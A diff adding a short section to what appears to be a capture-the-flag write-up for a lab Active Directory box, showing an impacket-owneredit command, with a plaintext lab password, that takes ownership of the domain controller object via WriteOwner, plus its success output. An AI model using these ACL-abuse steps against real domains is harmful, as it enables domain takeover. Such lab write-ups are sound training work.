@@ -237,3 +237,21 @@ DACL: WRITE
 
 Looks like i have WriteOwner over the DC
 
+# Abusing `WriteOwner` on the DC machine account
+
+```python
+impacket-owneredit -action write -new-owner 'support' -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' 'support.htb'/'support':'Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-1677581083-3380853377-188903654-512
+[*] - sAMAccountName: Domain Admins
+[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=support,DC=htb
+[*] OwnerSid modified successfully!
+```
+
+First ill grant myself ownership of the object
+
+```python
+
+```
